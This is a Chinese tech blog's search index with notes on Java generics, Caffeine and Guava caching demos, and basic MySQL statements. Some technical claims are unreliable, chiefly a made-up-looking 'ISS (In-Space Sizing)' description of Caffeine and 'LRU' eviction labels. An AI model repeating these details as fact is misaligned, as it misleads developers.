<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java笔记</title>
    <url>/cnblogs.github.io/2025/05/31/backEnd/java/Java%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="功能一【泛型通配符T-E-K-V解析】"><a href="#功能一【泛型通配符T-E-K-V解析】" class="headerlink" title="功能一【泛型通配符T&#x2F;E&#x2F;K&#x2F;V解析】"></a>功能一【泛型通配符T&#x2F;E&#x2F;K&#x2F;V解析】</h3><h4 id="T（Type）：万能替身演员"><a href="#T（Type）：万能替身演员" class="headerlink" title="T（Type）：万能替身演员"></a>T（Type）：万能替身演员</h4><p>作为泛型的“门面担当”，T在类、方法、接口中扮演任意类型的占位符：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 泛型类：盒子能装任何类型的物品  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MagicBox</span>&lt;T&gt; &#123;  </span><br><span class="line">    <span class="keyword">private</span> T secret;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">store</span><span class="params">(T item)</span> &#123; <span class="built_in">this</span>.secret = item; &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 使用时指定具体类型  </span></span><br><span class="line">MagicBox&lt;String&gt; wordBox = <span class="keyword">new</span> <span class="title class_">MagicBox</span>&lt;&gt;();  </span><br><span class="line">wordBox.store(<span class="string">&quot;Hello Generics!&quot;</span>);  <span class="comment">// 编译期自动类型检查[1,5](@ref)  </span></span><br></pre></td></tr></table></figure>
<p><strong>核心价值：</strong></p>
<ul>
<li>消除强制转换（告别(String)list.get(0)的提心吊胆）</li>
<li>防止ClassCastException（错误在编译期就被拦截）</li>
</ul>
<h4 id="E（Element）：集合家族的专属身份证"><a href="#E（Element）：集合家族的专属身份证" class="headerlink" title="E（Element）：集合家族的专属身份证"></a>E（Element）：集合家族的专属身份证</h4><p>当你在List<E>或Set<E>中看到E，它专指集合元素类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeList</span>&lt;E&gt; &#123;  </span><br><span class="line">    <span class="keyword">private</span> List&lt;E&gt; data = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  </span><br><span class="line">    <span class="comment">// 确保存入/取出类型一致  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addElement</span><span class="params">(E e)</span> &#123; data.add(e); &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 使用时明确元素类型  </span></span><br><span class="line">SafeList&lt;Integer&gt; scores = <span class="keyword">new</span> <span class="title class_">SafeList</span>&lt;&gt;();  </span><br><span class="line">scores.addElement(<span class="number">95</span>);  <span class="comment">// 若尝试add(&quot;A+&quot;)会直接编译报错[3,4](@ref)  </span></span><br></pre></td></tr></table></figure>
<p><strong>设计哲学：</strong>让集合像“类型保险箱”，存入和取出保持类型一致性</p>
<h4 id="K-V（Key-Value）：映射关系的黄金搭档"><a href="#K-V（Key-Value）：映射关系的黄金搭档" class="headerlink" title="K&#x2F;V（Key&#x2F;Value）：映射关系的黄金搭档"></a>K&#x2F;V（Key&#x2F;Value）：映射关系的黄金搭档</h4><p>这对CP专为Map量身定制，定义键值对的类型约束：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigCache</span>&lt;K, V&gt; &#123;  </span><br><span class="line">    <span class="keyword">private</span> Map&lt;K, V&gt; cacheMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveConfig</span><span class="params">(K key, V value)</span> &#123;  </span><br><span class="line">        cacheMap.put(key, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 使用时明确键值类型  </span></span><br><span class="line">ConfigCache&lt;String, LocalDateTime&gt; timeCache = <span class="keyword">new</span> <span class="title class_">ConfigCache</span>&lt;&gt;();  </span><br><span class="line">timeCache.saveConfig(<span class="string">&quot;userLogin&quot;</span>, LocalDateTime.now());  </span><br></pre></td></tr></table></figure>
<p><strong>黄金法则：</strong></p>
<ul>
<li>K约束键的类型（如必须实现hashCode()）</li>
<li>V约束值的类型（如统一存储JSON对象</li>
</ul>
<h4 id="上界通配符：类型安全的“天花板”"><a href="#上界通配符：类型安全的“天花板”" class="headerlink" title="上界通配符：类型安全的“天花板”"></a>上界通配符：类型安全的“天花板”</h4><p>&lt;? extends T&gt;定义类型上限，常用于数据消费场景：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 处理所有动物及其子类（Cat/Dog）  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feedAnimals</span><span class="params">(List&lt;? extends Animal&gt; animals)</span> &#123;  </span><br><span class="line">    animals.forEach(Animal::eat);  <span class="comment">// 安全调用父类方法  </span></span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 可传入List&lt;Cat&gt;但不能传入List&lt;Object&gt;[4,5](@ref)  </span></span><br></pre></td></tr></table></figure>
<p><strong>优势：</strong> 保证集合元素至少具备父类特性</p>
<h4 id="下界通配符：类型系统的“地板”"><a href="#下界通配符：类型系统的“地板”" class="headerlink" title="下界通配符：类型系统的“地板”"></a>下界通配符：类型系统的“地板”</h4><p>&lt;? super T&gt;设定类型下限，适用于数据生产场景：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 向容器添加特定类型元素  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fillNumbers</span><span class="params">(List&lt;? <span class="built_in">super</span> Integer&gt; list)</span> &#123;  </span><br><span class="line">    list.add(<span class="number">42</span>);  <span class="comment">// 允许添加Integer及其父类容器  </span></span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 可传入List&lt;Number&gt;或List&lt;Object&gt;[4,5](@ref) </span></span><br></pre></td></tr></table></figure>
<p><strong>经典案例：</strong> Collections.copy(dest, src)方法实现</p>
<h3 id="功能二【本地缓存Caffeine和Guava】"><a href="#功能二【本地缓存Caffeine和Guava】" class="headerlink" title="功能二【本地缓存Caffeine和Guava】"></a>功能二【本地缓存Caffeine和Guava】</h3><h4 id="Caffeine"><a href="#Caffeine" class="headerlink" title="Caffeine"></a>Caffeine</h4><p>Caffeine 是一个性能ISS（In-Space Sizing）的缓存框架，它使用无锁算法和分段锁机制，以更优的方式优化了缓存淘汰算法。Caffeine 的设计目标为极致性能，并针对一些常见的场景进行了优化。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.ben-manes.caffeine<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>caffeine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.github.benmanes.caffeine.cache.*;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CompletableFuture;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CaffeineDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        basicUsageDemo();</span><br><span class="line">        loadingCacheDemo();</span><br><span class="line">        asyncLoadingCacheDemo();</span><br><span class="line">        evictionDemo();</span><br><span class="line">        statisticsDemo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 基础缓存操作示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">basicUsageDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 1. 基础缓存操作 ===&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        Cache&lt;String, String&gt; cache = Caffeine.newBuilder()</span><br><span class="line">            .expireAfterWrite(<span class="number">5</span>, TimeUnit.SECONDS) <span class="comment">// 写入5秒后过期</span></span><br><span class="line">            .maximumSize(<span class="number">100</span>)                     <span class="comment">// 最大100个条目</span></span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 手动写入</span></span><br><span class="line">        cache.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取值（不存在返回null）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> cache.getIfPresent(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取key1: &quot;</span> + value);  <span class="comment">// 输出: value1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取或计算（线程安全）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value2</span> <span class="operator">=</span> cache.get(<span class="string">&quot;key2&quot;</span>, k -&gt; <span class="string">&quot;computed-&quot;</span> + k);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取key2: &quot;</span> + value2); <span class="comment">// 输出: computed-key2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动加载缓存示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">loadingCacheDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 2. 自动加载缓存 ===&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        LoadingCache&lt;String, String&gt; cache = Caffeine.newBuilder()</span><br><span class="line">            .expireAfterAccess(<span class="number">3</span>, TimeUnit.SECONDS) <span class="comment">// 3秒未访问则过期</span></span><br><span class="line">            .maximumSize(<span class="number">10</span>)</span><br><span class="line">            .build(key -&gt; &#123;</span><br><span class="line">                <span class="comment">// 模拟从数据库加载</span></span><br><span class="line">                System.out.println(<span class="string">&quot;正在加载: &quot;</span> + key);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;db-value-&quot;</span> + key;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动触发加载函数</span></span><br><span class="line">        System.out.println(cache.get(<span class="string">&quot;user1001&quot;</span>)); <span class="comment">// 输出: db-value-user1001</span></span><br><span class="line">        System.out.println(cache.get(<span class="string">&quot;user1001&quot;</span>)); <span class="comment">// 第二次直接从缓存获取</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 异步加载缓存示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">asyncLoadingCacheDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 3. 异步加载缓存 ===&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        AsyncLoadingCache&lt;String, String&gt; cache = Caffeine.newBuilder()</span><br><span class="line">            .expireAfterWrite(<span class="number">10</span>, TimeUnit.SECONDS)</span><br><span class="line">            .maximumSize(<span class="number">1000</span>)</span><br><span class="line">            .buildAsync(key -&gt; &#123;</span><br><span class="line">                <span class="comment">// 模拟异步加载</span></span><br><span class="line">                <span class="keyword">return</span> CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;异步加载: &quot;</span> + key);</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;async-value-&quot;</span> + key;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 异步获取</span></span><br><span class="line">        cache.get(<span class="string">&quot;id123&quot;</span>).thenAccept(value -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;异步获取结果: &quot;</span> + value); <span class="comment">// 输出: async-value-id123</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 淘汰策略示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">evictionDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 4. 淘汰策略 ===&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        Cache&lt;String, String&gt; cache = Caffeine.newBuilder()</span><br><span class="line">            .maximumSize(<span class="number">3</span>) <span class="comment">// 测试用的小容量</span></span><br><span class="line">            .removalListener((key, value, cause) -&gt; </span><br><span class="line">                System.out.printf(<span class="string">&quot;淘汰事件: key=%s, 原因=%s\n&quot;</span>, key, cause))</span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">        cache.put(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;k2&quot;</span>, <span class="string">&quot;v2&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;k3&quot;</span>, <span class="string">&quot;v3&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;k4&quot;</span>, <span class="string">&quot;v4&quot;</span>); <span class="comment">// 触发淘汰（LRU）</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;当前大小: &quot;</span> + cache.estimatedSize()); <span class="comment">// 输出: 3</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 统计功能示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">statisticsDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 5. 统计功能 ===&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        Cache&lt;String, String&gt; cache = Caffeine.newBuilder()</span><br><span class="line">            .maximumSize(<span class="number">100</span>)</span><br><span class="line">            .recordStats() <span class="comment">// 开启统计</span></span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">        cache.put(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br><span class="line">        cache.getIfPresent(<span class="string">&quot;k1&quot;</span>);</span><br><span class="line">        cache.getIfPresent(<span class="string">&quot;missingKey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CacheStats</span> <span class="variable">stats</span> <span class="operator">=</span> cache.stats();</span><br><span class="line">        System.out.println(<span class="string">&quot;命中率: &quot;</span> + stats.hitRate());    <span class="comment">// 输出: 0.5</span></span><br><span class="line">        System.out.println(<span class="string">&quot;命中数: &quot;</span> + stats.hitCount());    <span class="comment">// 输出: 1</span></span><br><span class="line">        System.out.println(<span class="string">&quot;未命中数: &quot;</span> + stats.missCount()); <span class="comment">// 输出: 1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Guava-Cache"><a href="#Guava-Cache" class="headerlink" title="Guava Cache"></a>Guava Cache</h4><p>Guava Cache 是 Google 官方提供的一个缓存框架，它提供了许多高级特性，如自动加载、统计、序列化、并发控制等。与 Caffeine 不同，Guava Cache 的设计目标为简单易用，并支持更多的高级特性。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>33.4.8-jre<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutionException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> com.google.common.cache.*;</span><br><span class="line"><span class="keyword">import</span> io.vavr.collection.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GuavaCacheDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException &#123;</span><br><span class="line">        basicUsageDemo();</span><br><span class="line">        loadingCacheDemo();</span><br><span class="line">        cacheRemovalListenerDemo();</span><br><span class="line">        cacheStatisticsDemo();</span><br><span class="line">        advancedEvictionDemo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 基础缓存操作示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">basicUsageDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 1. 基础缓存操作 ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Cache&lt;String, String&gt; cache = CacheBuilder.newBuilder().expireAfterWrite(<span class="number">5</span>, TimeUnit.SECONDS) <span class="comment">// 写入5秒后过期</span></span><br><span class="line">            .maximumSize(<span class="number">100</span>) <span class="comment">// 最大100个条目</span></span><br><span class="line">            .concurrencyLevel(<span class="number">4</span>) <span class="comment">// 并发级别</span></span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 手动写入</span></span><br><span class="line">        cache.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取值（不存在返回null）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> cache.getIfPresent(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取key1: &quot;</span> + value); <span class="comment">// 输出: value1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试获取不存在的key</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value2</span> <span class="operator">=</span> cache.getIfPresent(<span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取不存在的key2: &quot;</span> + value2); <span class="comment">// 输出: null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动加载缓存示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">loadingCacheDemo</span><span class="params">()</span> <span class="keyword">throws</span> ExecutionException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 2. 自动加载缓存 ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        LoadingCache&lt;String, String&gt; cache = CacheBuilder.newBuilder().expireAfterAccess(<span class="number">3</span>, TimeUnit.SECONDS) <span class="comment">// 3秒未访问则过期</span></span><br><span class="line">            .maximumSize(<span class="number">10</span>).build(<span class="keyword">new</span> <span class="title class_">CacheLoader</span>&lt;String, String&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> String <span class="title function_">load</span><span class="params">(String key)</span> &#123;</span><br><span class="line">                    <span class="comment">// 模拟从数据库加载</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;正在加载: &quot;</span> + key);</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;db-value-&quot;</span> + key;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动触发加载函数</span></span><br><span class="line">        System.out.println(cache.get(<span class="string">&quot;user1001&quot;</span>)); <span class="comment">// 输出: db-value-user1001</span></span><br><span class="line">        System.out.println(cache.get(<span class="string">&quot;user1001&quot;</span>)); <span class="comment">// 第二次直接从缓存获取</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 批量获取</span></span><br><span class="line">        System.out.println(cache.getAll(List.of(<span class="string">&quot;user1002&quot;</span>, <span class="string">&quot;user1003&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 缓存淘汰监听器示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">cacheRemovalListenerDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 3. 淘汰监听器 ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        RemovalListener&lt;String, String&gt; listener = notification -&gt; &#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;淘汰事件: key=%s, value=%s, 原因=%s\n&quot;</span>, notification.getKey(), notification.getValue(),</span><br><span class="line">                notification.getCause());</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Cache&lt;String, String&gt; cache = CacheBuilder.newBuilder().maximumSize(<span class="number">3</span>) <span class="comment">// 测试用的小容量</span></span><br><span class="line">            .removalListener(listener).build();</span><br><span class="line"></span><br><span class="line">        cache.put(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;k2&quot;</span>, <span class="string">&quot;v2&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;k3&quot;</span>, <span class="string">&quot;v3&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;k4&quot;</span>, <span class="string">&quot;v4&quot;</span>); <span class="comment">// 触发淘汰（LRU）</span></span><br><span class="line"></span><br><span class="line">        cache.invalidate(<span class="string">&quot;k2&quot;</span>); <span class="comment">// 手动触发淘汰</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 缓存统计示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">cacheStatisticsDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 4. 缓存统计 ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Cache&lt;String, String&gt; cache = CacheBuilder.newBuilder().maximumSize(<span class="number">100</span>).recordStats() <span class="comment">// 开启统计</span></span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">        cache.put(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br><span class="line">        cache.getIfPresent(<span class="string">&quot;k1&quot;</span>);</span><br><span class="line">        cache.getIfPresent(<span class="string">&quot;missingKey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CacheStats</span> <span class="variable">stats</span> <span class="operator">=</span> cache.stats();</span><br><span class="line">        System.out.println(<span class="string">&quot;命中率: &quot;</span> + stats.hitRate()); <span class="comment">// 输出: 0.5</span></span><br><span class="line">        System.out.println(<span class="string">&quot;命中数: &quot;</span> + stats.hitCount()); <span class="comment">// 输出: 1</span></span><br><span class="line">        System.out.println(<span class="string">&quot;未命中数: &quot;</span> + stats.missCount()); <span class="comment">// 输出: 1</span></span><br><span class="line">        System.out.println(<span class="string">&quot;加载成功数: &quot;</span> + stats.loadSuccessCount());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 高级淘汰策略示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">advancedEvictionDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 5. 高级淘汰策略 ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Cache&lt;String, String&gt; cache = CacheBuilder.newBuilder()</span><br><span class="line">            <span class="comment">// 基于权重的淘汰（假设不同value占用不同空间）</span></span><br><span class="line">            .maximumWeight(<span class="number">1000</span>).weigher((String key, String value) -&gt; value.length())</span><br><span class="line">            <span class="comment">// 弱引用key和value（适合缓存大对象）</span></span><br><span class="line">            .weakKeys().weakValues()</span><br><span class="line">            <span class="comment">// 定期维护（减少并发开销）</span></span><br><span class="line">            .concurrencyLevel(<span class="number">8</span>).build();</span><br><span class="line"></span><br><span class="line">        cache.put(<span class="string">&quot;long&quot;</span>, <span class="string">&quot;这是一个很长的字符串值&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;short&quot;</span>, <span class="string">&quot;小&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;当前大小: &quot;</span> + cache.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>MySql笔记</title>
    <url>/cnblogs.github.io/2025/01/18/database/mysql/MySql%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="MySQL基础语句"><a href="#MySQL基础语句" class="headerlink" title="MySQL基础语句"></a>MySQL基础语句</h3><h4 id="MySQL数据库语句"><a href="#MySQL数据库语句" class="headerlink" title="MySQL数据库语句"></a>MySQL数据库语句</h4><h5 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database name; 创建数据库</span><br></pre></td></tr></table></figure>
<h5 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use databasename; 选择数据库</span><br></pre></td></tr></table></figure>
<h5 id="选择数据库-1"><a href="#选择数据库-1" class="headerlink" title="选择数据库"></a>选择数据库</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> database name; 删除数据库</span><br></pre></td></tr></table></figure>
<h4 id="MySQL表语句"><a href="#MySQL表语句" class="headerlink" title="MySQL表语句"></a>MySQL表语句</h4><h5 id="新建表"><a href="#新建表" class="headerlink" title="新建表"></a>新建表</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 新增一个User表</span></span><br><span class="line"><span class="keyword">CREATE TABLE</span> <span class="keyword">user</span>(</span><br><span class="line">id <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT NULL</span> COMMENT <span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">create_by <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建人&#x27;</span>,</span><br><span class="line">create_date datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">update_by <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;更新人&#x27;</span>,</span><br><span class="line">update_date datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;更新时间&#x27;</span>,</span><br><span class="line">status <span class="type">varchar</span>(<span class="number">2</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;数据状态&#x27;</span>,</span><br><span class="line"><span class="keyword">PRIMARY KEY</span> (id)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;user表&#x27;</span>;</span><br></pre></td></tr></table></figure>
